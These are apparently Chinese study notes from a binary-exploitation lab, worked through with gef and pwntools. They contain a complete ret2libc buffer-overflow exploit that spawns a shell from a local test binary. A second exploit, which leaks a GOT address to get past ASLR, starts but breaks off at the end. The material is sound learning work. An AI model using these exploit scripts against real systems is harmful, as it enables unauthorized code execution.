&lt;p&gt;为什么书上的和自己运行的不一样? 哪里有区别?&lt;/p&gt;
&lt;p&gt;因为减错了,应该0xffffd5b8 - 0xffffd530 &amp;#x3D; 136才对,再+4, 140覆盖掉ebp,然后下面的就是eip了&lt;/p&gt;
&lt;h3 id=&#34;通过gef自带的命令&#34;&gt;&lt;a href=&#34;#通过gef自带的命令&#34; class=&#34;headerlink&#34; title=&#34;通过gef自带的命令&#34;&gt;&lt;/a&gt;通过gef自带的命令&lt;/h3&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;gef➤  pattern create &lt;span class=&#34;number&#34;&gt;150&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[+] Generating a pattern of &lt;span class=&#34;number&#34;&gt;150&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;bytes&lt;/span&gt; (n=&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[+] Saved &lt;span class=&#34;keyword&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;$_gef0&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gef➤  r&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Starting program: /home/ubuntu/pwn/a.out&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] Failed to find objfile &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;not&lt;/span&gt; a valid file &lt;span class=&#34;built_in&#34;&gt;format&lt;/span&gt;: [Errno &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;] No such file &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; directory: &lt;span class=&#34;string&#34;&gt;&amp;#x27;system-supplied DSO at 0xf7fd8000&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Program received signal SIGSEGV, Segmentation fault.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x6261616b&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; ?? ()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gef➤  pattern offset &lt;span class=&#34;number&#34;&gt;0x6261616b&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[+] Searching &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;0x6261616b&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[+] Found at offset &lt;span class=&#34;number&#34;&gt;140&lt;/span&gt; (little-endian search) likely&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[+] Found at offset &lt;span class=&#34;number&#34;&gt;1004&lt;/span&gt; (big-endian search)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&#34;构造exp&#34;&gt;&lt;a href=&#34;#构造exp&#34; class=&#34;headerlink&#34; title=&#34;构造exp&#34;&gt;&lt;/a&gt;构造exp&lt;/h2&gt;&lt;p&gt;整理思路就是返回地址设置为 system,然后给一个参数&amp;#x2F;bin&amp;#x2F;sh就好了&lt;/p&gt;
&lt;p&gt;问题就是寻找它俩的地址,关闭ALSR的情况下,libc的地址是固定的,可以在调试中确认system和&amp;#x2F;bin&amp;#x2F;sh的地址&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;gef➤  p system&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; = &amp;#123;&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt; (const char *)&amp;#125; &lt;span class=&#34;number&#34;&gt;0xf7e57db0&lt;/span&gt; &amp;lt;__libc_system&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gef➤  search-pattern &lt;span class=&#34;string&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[+] Searching &lt;span class=&#34;string&#34;&gt;&amp;#x27;/bin/sh&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; memory&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[+] In &lt;span class=&#34;string&#34;&gt;&amp;#x27;/home/ubuntu/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/libc-2.23.so&amp;#x27;&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0xf7e1d000&lt;/span&gt;-&lt;span class=&#34;number&#34;&gt;0xf7fcd000&lt;/span&gt;), permission=r-x&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;number&#34;&gt;0xf7f78b2b&lt;/span&gt; - &lt;span class=&#34;number&#34;&gt;0xf7f78b32&lt;/span&gt;  →   &lt;span class=&#34;string&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;给的exp同样会有问题(注意 system和&amp;#x2F;bin&amp;#x2F;sh地址要根据实际情况修改,修改了也不行&lt;/p&gt;
&lt;p&gt;[*] Got EOF while sending in interactive&lt;/p&gt;
&lt;p&gt;默认开启了其他保护?????? gcc的问题???&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;root@VM-&lt;span class=&#34;number&#34;&gt;24&lt;/span&gt;-&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;-ubuntu:/home/ubuntu/pwn&lt;span class=&#34;comment&#34;&gt;# python3 exp1.py&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[+] Starting local process &lt;span class=&#34;string&#34;&gt;&amp;#x27;./a.out&amp;#x27;&lt;/span&gt;: pid &lt;span class=&#34;number&#34;&gt;5096&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] &lt;span class=&#34;string&#34;&gt;&amp;#x27;/home/ubuntu/pwn/a.out&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Arch:     i386-&lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;-little&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    RELRO:    Full RELRO&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Stack:    No canary found&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    NX:       NX enabled&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    PIE:      PIE enabled&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;gcc -m32 -fno-stack-protector -z noexecstack -z norelro dep.c -fno-pie -no-pie -o a.out&lt;/p&gt;
&lt;p&gt;全关了也不行啊&lt;/p&gt;
&lt;p&gt;libc的保护为什么不影响呢??&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;gef➤  p system&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; = &amp;#123;&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt; (const char *)&amp;#125; &lt;span class=&#34;number&#34;&gt;0xf7e223d0&lt;/span&gt; &amp;lt;__libc_system&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gef➤  search-pattern &lt;span class=&#34;string&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[+] Searching &lt;span class=&#34;string&#34;&gt;&amp;#x27;/bin/sh&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; memory&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[+] In &lt;span class=&#34;string&#34;&gt;&amp;#x27;/lib/i386-linux-gnu/libc-2.27.so&amp;#x27;&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0xf7de5000&lt;/span&gt;-&lt;span class=&#34;number&#34;&gt;0xf7fba000&lt;/span&gt;), permission=r-x&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;number&#34;&gt;0xf7f631db&lt;/span&gt; - &lt;span class=&#34;number&#34;&gt;0xf7f631e2&lt;/span&gt;  →   &lt;span class=&#34;string&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;调试一下,这种如何调试呢??????&lt;/p&gt;
&lt;p&gt;0xf7e57db0&lt;/p&gt;
&lt;p&gt;0xf7f78b2b&lt;/p&gt;
&lt;p&gt;不知道为什么,重新编译了一遍就好了….太奇怪了&lt;/p&gt;
&lt;h3 id=&#34;如何动态获取这俩地址呢&#34;&gt;&lt;a href=&#34;#如何动态获取这俩地址呢&#34; class=&#34;headerlink&#34; title=&#34;如何动态获取这俩地址呢?&#34;&gt;&lt;/a&gt;如何动态获取这俩地址呢?&lt;/h3&gt;&lt;p&gt;system_addr &amp;#x3D; libc.sym[‘system’] 这样是不行的,这个获取的是在libc里面的偏移,需要获取libc的加载地址&lt;/p&gt;
&lt;p&gt;需要基地址,基地址怎么获取呢? 如果没开启ALSR和PIE的话,可以通过调试获取,pwntools里不能直接获取吗?&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;gef➤  vmmap&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[ Legend:  Code | Heap | Stack ]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Start      End        Offset     Perm Path&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x8047000&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x8048000&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x000000&lt;/span&gt; rw- /home/ubuntu/pwn/a.out&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x8048000&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x8049000&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x001000&lt;/span&gt; r-x /home/ubuntu/pwn/a.out&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x8049000&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x804a000&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x001000&lt;/span&gt; rw- /home/ubuntu/pwn/a.out&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xf7e1c000&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0xf7e1d000&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x000000&lt;/span&gt; rw-&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xf7e1d000&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0xf7fcd000&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x000000&lt;/span&gt; r-x /home/ubuntu/glibc-&lt;span class=&#34;built_in&#34;&gt;all&lt;/span&gt;-&lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt;-one/libs/&lt;span class=&#34;number&#34;&gt;2.23&lt;/span&gt;-0ubuntu11&lt;span class=&#34;number&#34;&gt;.3&lt;/span&gt;_i386/libc-&lt;span class=&#34;number&#34;&gt;2.23&lt;/span&gt;.so&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;0xf7e1d000  + 0x3adb0 &amp;#x3D;  0xf7e57db0 这样就对上了&lt;/p&gt;
&lt;p&gt;system_addr &amp;#x3D; 0xf7e1d000 + libc.sym[‘system’] 就可以得到system的地址了&lt;/p&gt;
&lt;p&gt;但是 binsh_addr &amp;#x3D; 0xf7e1d000 + libc.search(b’&amp;#x2F;bin&amp;#x2F;sh’) 这个不会,会报错 &lt;/p&gt;
&lt;p&gt;oooooo需要加一个next&lt;/p&gt;
&lt;p&gt;binsh_addr &amp;#x3D; 0xf7e1d000 + next(libc.search(b’&amp;#x2F;bin&amp;#x2F;sh’))&lt;/p&gt;
&lt;h3 id=&#34;最后exp&#34;&gt;&lt;a href=&#34;#最后exp&#34; class=&#34;headerlink&#34; title=&#34;最后exp&#34;&gt;&lt;/a&gt;最后exp&lt;/h3&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;log_level = &lt;span class=&#34;string&#34;&gt;&amp;quot;debug&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io = process(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./a.out&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc = ELF(&lt;span class=&#34;string&#34;&gt;&amp;quot;/home/ubuntu/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/libc-2.23.so&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ret = &lt;span class=&#34;number&#34;&gt;0xdeadbeef&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system_addr = &lt;span class=&#34;number&#34;&gt;0xf7e1d000&lt;/span&gt; + libc.sym[&lt;span class=&#34;string&#34;&gt;&amp;#x27;system&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;binsh_addr = &lt;span class=&#34;number&#34;&gt;0xf7e1d000&lt;/span&gt; + &lt;span class=&#34;built_in&#34;&gt;next&lt;/span&gt;(libc.search(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;/bin/sh&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#system_addr = 0xf7e57db0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#binsh_addr = 0xf7f78b2b&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = &lt;span class=&#34;string&#34;&gt;b&amp;quot;A&amp;quot;&lt;/span&gt; * &lt;span class=&#34;number&#34;&gt;140&lt;/span&gt; + p32(system_addr) + p32(ret) + p32(binsh_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.send(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h1 id=&#34;在此基础之上-开启ALSR&#34;&gt;&lt;a href=&#34;#在此基础之上-开启ALSR&#34; class=&#34;headerlink&#34; title=&#34;在此基础之上,开启ALSR&#34;&gt;&lt;/a&gt;在此基础之上,开启ALSR&lt;/h1&gt;&lt;p&gt;echo 2 &amp;gt; &amp;#x2F;proc&amp;#x2F;sys&amp;#x2F;kernel&amp;#x2F;randomize_va_space&lt;/p&gt;
&lt;p&gt;gcc -m32 -fno-stack-protector -z noexecstack -no-pie dep.c -o nopie.out&lt;/p&gt;
&lt;p&gt;echo 2 &amp;gt; &amp;#x2F;proc&amp;#x2F;sys&amp;#x2F;kernel&amp;#x2F;randomize_va_space&lt;/p&gt;
&lt;p&gt;cp ..&amp;#x2F;glibc-all-in-one&amp;#x2F;libs&amp;#x2F;2.23-0ubuntu11.3_i386&amp;#x2F;libc.so.6 .&amp;#x2F;&lt;/p&gt;
&lt;p&gt;ASLR改变的是堆、栈、共享库(libc等)的位置,程序本身的地址是不变的,也就是vuln_func,main等这些地址.&lt;/p&gt;
&lt;h2 id=&#34;构造exp-1&#34;&gt;&lt;a href=&#34;#构造exp-1&#34; class=&#34;headerlink&#34; title=&#34;构造exp&#34;&gt;&lt;/a&gt;构造exp&lt;/h2&gt;&lt;p&gt;那为啥exp中的write也是不变的呢??????因为这个write是plt中的write,不是libc中的,所以和延迟绑定有关?&lt;/p&gt;
&lt;p&gt;0x8048320是write的地址,它是plt表的地址,所以,什么是plt表呢?&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;.plt:08048320 _write          proc near               ; CODE XREF: main+2D↓p&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.plt:08048320                 jmp     ds:off_804A014&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.plt:08048320 _write          endp&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;关于plt表&#34;&gt;&lt;a href=&#34;#关于plt表&#34; class=&#34;headerlink&#34; title=&#34;关于plt表&#34;&gt;&lt;/a&gt;关于plt表&lt;/h3&gt;&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/qq_38350702/article/details/123387642&#34;&gt;https://blog.csdn.net/qq_38350702&amp;#x2F;article&amp;#x2F;details&amp;#x2F;123387642&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;所以说应该是plt表地址我们是知道的,但是got不知道,通过plt泄露got,进而得到system的got&lt;/p&gt;
&lt;p&gt;因为system不在plt里,无法直接用system的plt&lt;/p&gt;
&lt;p&gt;思路就是先用write泄露write在内存中的位置,然后利用write在libc中和system的偏移,进行计算system和&amp;#x2F;bin&amp;#x2F;sh&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io = process(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./nopie.out&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf = ELF(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./nopie.out&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc = ELF(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./libc.so.6&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;vuln_func = &lt;span class=&#34;number&#34;&gt;0x0804843b&lt;/span&gt; //vuln_func&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload1 = &lt;span class=&#34;string&#34;&gt;b&amp;quot;A&amp;quot;&lt;/span&gt; * &lt;span class=&#34;number&#34;&gt;140&lt;/span&gt; + p32(elf.sym[&lt;span class=&#34;string&#34;&gt;&amp;#x27;write&amp;#x27;&lt;/span&gt;]) + p32(vuln_func) + p32(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) + p32(elf.got[&lt;span 